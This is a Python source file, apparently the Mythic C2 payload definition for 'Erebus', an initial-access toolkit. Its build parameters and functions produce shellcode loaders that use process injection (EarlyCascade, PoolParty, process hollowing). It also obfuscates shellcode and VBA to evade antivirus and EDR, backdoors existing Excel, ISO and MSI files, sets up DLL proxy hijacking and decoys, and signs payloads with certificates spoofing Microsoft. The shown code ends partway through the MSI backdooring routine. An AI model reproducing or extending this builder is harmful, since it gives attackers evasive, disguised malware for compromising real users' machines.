'''
- Author(s): Lavender-exe // hunterino-sec // Whispergate
- Title: Erebus
- Description: Initial Access Wrapper

TODO:
- Triggers
    - LNK
        -   https://github.com/strayge/pylnk
'''

from erebus_wrapper.erebus.modules.plugin_loader import get_plugin_loader
from erebus_wrapper.erebus.modules import run_plugin_validation, report_validation_results

_plugin_loader = get_plugin_loader()

try:
    from erebus_wrapper.erebus.modules.archive.payload_dll_proxy import generate_proxies
except ImportError:
    generate_proxies = _plugin_loader.get_function("generate_proxies")

try:
    from erebus_wrapper.erebus.modules.archive.container_clickonce import build_clickonce
except ImportError:
    build_clickonce = _plugin_loader.get_function("build_clickonce")

try:
    from erebus_wrapper.erebus.modules.archive.container_msi import (
        build_msi,
        hijack_msi,
        add_multiple_files_to_msi,
        ErebusActionTypes,
        ErebusInstallerToolkit
    )
except ImportError:
    build_msi = _plugin_loader.get_function("build_msi")
    hijack_msi = _plugin_loader.get_function("hijack_msi")
    add_multiple_files_to_msi = _plugin_loader.get_function("add_multiple_files_to_msi")

try:
    from erebus_wrapper.erebus.modules.archive.trigger_lnk import create_payload_trigger
except ImportError:
    create_payload_trigger = _plugin_loader.get_function("create_payload_trigger")

try:
    from erebus_wrapper.erebus.modules.archive.trigger_bat import create_bat_payload_trigger
except ImportError:
    create_bat_payload_trigger = _plugin_loader.get_function("create_bat_payload_trigger")

try:
    from erebus_wrapper.erebus.modules.archive.trigger_msi import create_msi_payload_trigger
except ImportError:
    create_msi_payload_trigger = _plugin_loader.get_function("create_msi_payload_trigger")

try:
    from erebus_wrapper.erebus.modules.archive.trigger_clickonce import create_clickonce_trigger
except ImportError:
    create_clickonce_trigger = _plugin_loader.get_function("create_clickonce_trigger")

try:
    from erebus_wrapper.erebus.modules.archive.container_archive import build_7z, build_zip
except ImportError:
    build_7z = _plugin_loader.get_function("build_7z")
    build_zip = _plugin_loader.get_function("build_zip")

try:
    from erebus_wrapper.erebus.modules.archive.container_iso import build_iso
except ImportError:
    build_iso = _plugin_loader.get_function("build_iso")

try:
    from erebus_wrapper.erebus.modules.archive.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
except ImportError:
    self_sign_payload = _plugin_loader.get_function("self_sign_payload")
    get_remote_cert_details = _plugin_loader.get_function("get_remote_cert_details")
    sign_with_provided_cert = _plugin_loader.get_function("sign_with_provided_cert")

try:
    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import generate_excel_payload, backdoor_existing_excel
except ImportError:
    generate_excel_payload = _plugin_loader.get_function("generate_excel_payload")
    backdoor_existing_excel = _plugin_loader.get_function("backdoor_existing_excel")



# ==================== End Plugin System ====================

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
import os
import asyncio
import subprocess
import tempfile
import shutil
from pathlib import Path


ENCRYPTION_METHODS = {
    # "AES128_CBC" :  "aes_128",
    # "AES256_CBC" :  "aes_cbc",
    # "AES256_ECB" :  "aes_ecb",
    # "CHACHA20"   :  "chacha20",
    "RC4"        :  "rc4",
    # "SALSA20"    :  "salsa20",
    "XOR"        :  "xor",
    # "XOR_COMPLEX":  "xor_complex",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

#
# Commented out to reduce confusion
# uncomment the ones that you will use on your custom loader
#
SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    # "Nim"        : "nim",
    # "Go"         : "go",
    # "Python"     : "py",
    # "Powershell" : "ps1",
    # "VBA"        : "vba",
    # "VBScript"   : "vbs",
    # "Rust"       : "rust",
    # "JavaScript" : "js",
    # "Zig"        : "zig",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "iso",
    "msi"
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "v0.0.1"
    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows
        # SupportedOS.Linux, # Not Supported Yet
        # SupportedOS.MacOS, # Not Supported Yet
    ]

    wrapper = True
    wrapped_payloads = []
    c2_profiles = []

    # Plugin validation flag - run only once at startup
    _validation_run = False

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    _agent_icon_path = Path(__file__).resolve().parent.parent / "Erebus.png"
    agent_icon_path = str(_agent_icon_path)
    agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"

    build_parameters = [
        BuildParameter(
            name = "0.0 Main Payload Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the type of loader to use",
            choices = ["ClickOnce", "Shellcode Loader"],
            default_value = "Shellcode Loader",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = f"Select the loader's filetype",
            choices = ["EXE", "DLL"],
            default_value = "EXE",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 Loader Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 ClickOnce Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        # Shellcode Loader Injection Configuration
        BuildParameter(
            name = "0.4 Shellcode Loader - Injection Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection technique for the Shellcode Loader:
1 = NtQueueApcThread (Remote)
2 = NtMapViewOfSection (Remote)
3 = CreateFiber (Self)
4 = EarlyCascade (Remote)
5 = PoolParty (Remote)""",
            choices = ["1", "2", "3", "4", "5"],
            default_value = "1",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.5 Shellcode Loader - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection",
            default_value = "C:\\Windows\\System32\\notepad.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
            ]
        ),

        # ClickOnce Loader Injection Configuration
        BuildParameter(
            name = "0.6 ClickOnce - Injection Method",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection method for ClickOnce:
earlycascade (remote)
poolparty (remote)
classic (remote)
createfiber (self)
enumdesktops (self)
appdomain (self)""",
            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops", "appdomain"],
            default_value = "createfiber",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.7 ClickOnce - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection methods (leave empty for explorer.exe)",
            default_value = "explorer.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="createfiber"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
            ]
        ),
        
        BuildParameter(
            name="0.8 Output Extension Source",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
            choices=["Trigger", "MalDoc"],
            default_value="Trigger",
        ),

        BuildParameter(
            name="0.9 Trigger Type",
            parameter_type=BuildParameterType.ChooseOne,
            description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
            choices=["LNK", "BAT", "MSI", "ClickOnce"],
            default_value="BAT",
            required=False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
            ]
        ),

        BuildParameter(
            name = "0.9a Trigger Binary",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.9b Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),
        
  # MalDocs - Excel Backdooring
        BuildParameter(
            name="0.9 Create MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
            default_value="None",
            required=False,
            hide_conditions=[
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9a MalDoc Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create new Excel document or backdoor an existing one",
            choices=["Create New", "Backdoor Existing"],
            default_value="Create New",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9b Excel Source File",
            parameter_type=BuildParameterType.File,
            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9a MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9c VBA Execution Trigger",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA macro execution trigger method",
            choices=["AutoOpen", "OnClose", "OnSave"],
            default_value="AutoOpen",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9d Excel Document Name",
            parameter_type=BuildParameterType.String,
            description="Name/title for the Excel document",
            default_value="Invoice",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9e Obfuscate VBA",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate VBA code to evade AV/EDR detection",
            default_value=True,
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f MalDoc Injection Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
            choices=["Command Execution", "Shellcode Injection"],
            default_value="Command Execution",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9g VBA Loader Technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
            default_value="VirtualAlloc + CreateThread",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File Inclusion",
            parameter_type = BuildParameterType.Boolean,
            description = "Check whether you want the decoy file in the final payload or not",
            default_value = False,
            required=True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="0.13 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "1.0 DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: Shellcode Format must be set to C.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "2.0 Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

# TODO:
# Add more decryption support to loaders
        BuildParameter(
            name = "2.1 Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                # "AES128_CBC",
                # "AES256_CBC",
                # "AES256_ECB",
                # "CHACHA20",
                # "SALSA20",
                "RC4",
                "XOR",
                # "XOR_COMPLEX",
            ],
            default_value = "XOR"
        ),

        BuildParameter(
            name = "2.2 Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.3 Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.4 Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a format for the obfuscated shellcode.",
            choices = [
                # Uncomment lines for custom loaders
                "C",
                "CSharp",
                # "Nim",
                # "Go",
                # "Python",
                # "Powershell",
                # "VBA",
                # "VBScript",
                # "Rust",
                # "JavaScript",
                # "Zig",
                "Raw",
            ],
            default_value = "C",
            required = True,
        ),

        # Archive
        BuildParameter(
            name = "3.0 Container Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose the final payload container type.",
            choices = ["ISO", "7z", "Zip", "MSI"],
            default_value = "Zip",
        ),

        BuildParameter(
            name="3.1 Compression Level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select compression level (9 is max).",
            choices=["0", "1", "3", "5", "7", "9"],
            default_value="9",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        BuildParameter(
            name="3.2 Archive Password",
            parameter_type=BuildParameterType.String,
            description="Optional password for the archive (leave empty for none).",
            default_value="",
            required=False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        #ISO
        BuildParameter(
            name="4.0 ISO Volume ID",
            parameter_type=BuildParameterType.String,
            description="ISO Volume name seen in Explorer.",
            default_value="EREBUS",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.1 ISO enable Autorun",
            parameter_type=BuildParameterType.Boolean,
            description="Enable Autorun for ISO",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.2 ISO Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing ISO",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),
        BuildParameter(
            name="5.0 MSI Product Name",
            parameter_type=BuildParameterType.String,
            description="Application name shown in MSI/UI",
            default_value="System Updater",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.1 MSI Manufacturer",
            parameter_type=BuildParameterType.String,
            description="Company name shown in MSI metadata",
            default_value="Microsoft Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.2 MSI Install Scope",
            parameter_type=BuildParameterType.ChooseOne,
            description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
            choices=["User", "Machine"],
            default_value="User",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.3 MSI Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing MSI installer by injecting payload execution",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.4 MSI Attack Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="""Attack vector for MSI backdoor injection:
- execute: Run command via CustomAction (stealthiest)
- run-exe: Extract and execute EXE from Binary table
- load-dll: Load native DLL via DllEntry
- dotnet: Load .NET assembly (auto-detected)
- script: Execute VBScript/JScript (requires entry point)""",
            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
            default_value="execute",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        BuildParameter(
            name="5.5 MSI Entry Point",
            parameter_type=BuildParameterType.String,
            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe")
            ]
        ),
        BuildParameter(
            name="5.6 MSI Command Arguments",
            parameter_type=BuildParameterType.String,
            description="Command line arguments for execute/run-exe attacks",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe")
            ]
        ),
        BuildParameter(
            name="5.7 MSI Execution Condition",
            parameter_type=BuildParameterType.String,
            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
            default_value="NOT REMOVE",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        BuildParameter(
            name="5.8 MSI Custom Action Name",
            parameter_type=BuildParameterType.String,
            description="Custom action name (leave empty for random generation)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        #Codesigning
        BuildParameter(
            name="6.0 Codesign Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Sign the loader with a code signing cert",
            required=False,
        ),

        BuildParameter(
            name="6.1 Codesign Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose how you want to sign the payload",
            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
            required=False,
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
            ]
        ),

        BuildParameter(
            name="6.2 Codesign CN",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Common Name (CN) for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.3 Codesign Orgname",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Organisation Name for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.4 Codesign Spoof URL",
            parameter_type=BuildParameterType.String,
            default_value="www.google.com",
            description="URL to clone certificate details from",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
            ]
        ),

        BuildParameter(
            name="6.5 Codesign Cert",
            parameter_type=BuildParameterType.File,
            description="Upload PFX/P12 certificate",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),
        BuildParameter(
            name="6.6 Codesign Cert Password",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Certificate password (leave empty if none)",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),

]

    build_steps = [
        BuildStep(step_name = "Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),

        BuildStep(step_name = "Compiling ClickOnce Loader",
            step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),

        BuildStep(step_name = "Sign Shellcode Loader",
            step_description = "Signing the Shellcode Loader with a code signing certificate"),

        BuildStep(step_name = "Backdooring MSI",
                  step_description = "Injecting payload into existing MSI installer"),

        BuildStep(step_name = "Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "Creating MalDoc",
                  step_description = "Creating or backdooring Excel document with VBA payload"),

        BuildStep(step_name = "Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    async def obfuscate_vba(self, vba_code):
        """Obfuscate VBA code locally or via plugin"""
        try:
            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
            plugin = PayloadMalDocsPlugin()
            return plugin.obfuscate_vba(vba_code)
        except ImportError:
            # Fallback: simple obfuscation without plugin
            import re
            obfuscated = vba_code
            replacements = {
                'Shell': 'Sh' + chr(101) + 'll',
                'CreateObject': 'Cr' + chr(101) + 'ateObject',
                'WScript': 'WSc' + chr(114) + 'ipt',
            }
            for original, replacement in replacements.items():
                obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
            return obfuscated

    async def backdoor_msi_payload(self, agent_build_path):
        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory

        Enhanced with support for multiple attack vectors:
        - execute: Direct command execution
        - run-exe: Binary extraction and execution
        - load-dll: DLL loading with custom entry points
        - dotnet: .NET assembly loading
        - script: VBScript/JScript execution
        """
        msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
        if not msi_backdoor_uuid:
            return  # No MSI to backdoor

        try:
            # Download the uploaded MSI file
            file_resp = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
            )

            # Save the MSI to a temporary location
            temp_dir = Path(tempfile.gettempdir())
            source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
            source_msi_path.write_bytes(file_resp.Content)
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout="Downloading uploaded MSI installer...",
                StepSuccess=True,
            ))

            # Get attack parameters
            attack_type = self.get_parameter("5.4 MSI Attack Type")
            entry_point = self.get_parameter("5.5 MSI Entry Point")
            command_args = self.get_parameter("5.6 MSI Command Arguments")
            condition = self.get_parameter("5.7 MSI Execution Condition")
            custom_action_name = self.get_parameter("5.8 MSI Custom Action Name")

            # Generate random name if not provided
            if not custom_action_name:
                custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)

            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=f"Injecting payload into MSI installer (attack: {attack_type})...",
                StepSuccess=True,
            ))

            # Get the payload path
            payload_dir = Path(agent_build_path) / "payload"
            payload_file = None

            # Determine payload file based on attack type
            if attack_type in ["load-dll", "dotnet"]:
                # Look for DLL
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() == ".dll")
                except StopIteration:
                    # Fallback to EXE if no DLL found
                    try:
                        payload_file = next(p for p in payload_dir.iterdir()
                                          if p.is_file() and p.suffix.lower() == ".exe")
                    except StopIteration:
                        raise RuntimeError("No DLL or EXE payload found for MSI backdooring!")

            elif attack_type == "script":
                # Look for script files
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() in [".vbs",
                                                                              ".js", ".vbe", ".jse"])
                except StopIteration:
                    raise RuntimeError("No script file (.vbs/.js) found for script attack!")

            else:  # execute, run-exe
                # Look for EXE
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() == ".exe")
                except StopIteration:
                    raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")

            # Validate entry point for attacks that require it
            if attack_type in ["load-dll", "dotnet", "script"] and not entry_point:
                if attack_type == "script":
                    raise RuntimeError(f"Entry point (function name) is required for {attack_type} attack")
                else:
                    # Use default for DLL
                    entry_point = "DllEntry"

            # Call hijack_msi with advanced parameters
            backdoored_msi_path = hijack_msi(
                source_msi=source_msi_path,
                payload_path=payload_file,
                build_path=Path(agent_build_path),
                custom_action_name=custom_action_name,
                attack_type=attack_type,
                entry_point=entry_point,
                command_args=command_args,
                condition=condition
            )

            # Move the backdoored MSI into the payload directory
            final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
